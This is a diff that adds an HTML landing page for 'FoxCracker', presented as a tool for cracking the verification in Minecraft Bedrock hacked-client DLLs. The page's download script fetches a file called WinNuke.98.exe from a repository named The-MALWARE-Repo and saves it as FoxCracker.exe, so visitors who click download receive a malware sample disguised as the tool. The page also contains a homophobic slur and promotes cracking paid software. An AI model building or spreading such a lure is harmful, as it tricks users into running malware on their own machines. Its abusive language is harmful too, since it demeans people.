@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FoxCracker - a tool made for cracking MCBE hacked client verification.</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #202020;
+            color: #e0e0e0;
+            margin: 0;
+            padding: 20px;
+            scroll-behavior: smooth;
+        }
+        header {
+            background-color: #4b4b4b;
+            color: #ffffff;
+            padding: 20px;
+            text-align: center;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            transition: transform 0.3s;
+        }
+        header:hover {
+            transform: scale(1.02);
+        }
+        section {
+            margin: 20px 0;
+            padding: 20px;
+            background-color: #353535;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+        h2 {
+            color: #ffffff;
+            text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.5);
+        }
+        .cta-button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #616161;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: background-color 0.3s, transform 0.3s;
+        }
+        .cta-button:hover {
+            background-color: #4b4b4b;
+            transform: translateY(-2px);
+        }
+        .features-container {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+        }
+        .feature-box {
+            background-color: #2e2e2e;
+            color: #ffffff;
+            margin: 10px;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
+            width: calc(30% - 20px);
+            overflow: hidden;
+            transition: transform 0.3s;
+        }
+        .feature-box:hover {
+            transform: translateY(-5px);
+        }
+        .title-bar {
+            background-color: #4b4b4b;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            border-top-left-radius: 12px;
+            border-top-right-radius: 12px;
+        }
+        .title-bar .close, .title-bar .minimize, .title-bar .zoom {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin: 0 5px;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+        .title-bar .close:hover {
+            transform: scale(1.2);
+        }
+        .title-bar .minimize:hover {
+            transform: scale(1.2);
+        }
+        .title-bar .zoom:hover {
+            transform: scale(1.2);
+        }
+        .title-bar .close {
+            background-color: #ff5c5c;
+        }
+        .title-bar .minimize {
+            background-color: #ffbd44;
+        }
+        .title-bar .zoom {
+            background-color: #4caf50;
+        }
+        .feature-content {
+            padding: 20px;
+        }
+    </style>
+    <script>
+        function downloadFile() {
+            const link = document.createElement('a');
+            link.href = 'https://github.com/Da2dalus/The-MALWARE-Repo/raw/master/Virus/WinNuke.98.exe';
+            link.download = 'FoxCracker.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    </script>
+</head>
+<body>
+
+<header>
+    <h1>Welcome to FoxCracker</h1>
+    <p>A tool developed by imacutefox4u to help developers crack shitty hacked client dll's that have verification systems and are usually hidden behind stupid paywalls.</p>
+</header>
+
+<section>
+    <h2>About FoxCracker</h2>
+    <p>FoxCracker is some shitty tool that can crack dlls and shit idfk.</p>
+</section>
+
+<section class="features-container">
+    <div class="feature-box">
+        <div class="title-bar">
+            <div class="close"></div>
+            <div class="minimize"></div>
+            <div class="zoom"></div>
+        </div>
+        <div class="feature-content">
+            <h2>Inspect Verification Processes</h2>
+            <p>FoxCracker cracks MCBE dlls by decompiling dlls, checking for anything related to verifying, then telling you that information and how it may be able to be cracked.</p>
+        </div>
+    </div>
+    <div class="feature-box">
+        <div class="title-bar">
+            <div class="close"></div>
+            <div class="minimize"></div>
+            <div class="zoom"></div>
+        </div>
+        <div class="feature-content">
+            <h2>How to use</h2>
+            <p>Run the exe file and launch minecraft. Choose the dll file you wanna use in the program and it will inject into minecraft. If it detects any sort of verification, it will alert you on how it may be cracked or whatever it worked on nukev6 and gamesense so eh</p>
+        </div>
+    </div>
+    <div class="feature-box">
+        <div class="title-bar">
+            <div class="close"></div>
+            <div class="minimize"></div>
+            <div class="zoom"></div>
+        </div>
+        <div class="feature-content">
+            <h2>dumb shit</h2>
+            <p>running out of fucking ideas on what to fucking type</p>
+        </div>
+    </div>
+</section>
+
+<section>
+    <h2>Get Started</h2>
+    <p>Ready to explore? Download FoxCracker now or ur fucking gay</p>
+    <a href="javascript:void(0)" class="cta-button" onclick="downloadFile()">Download FoxCracker</a>
+</section>
+
+</body>
+</html>
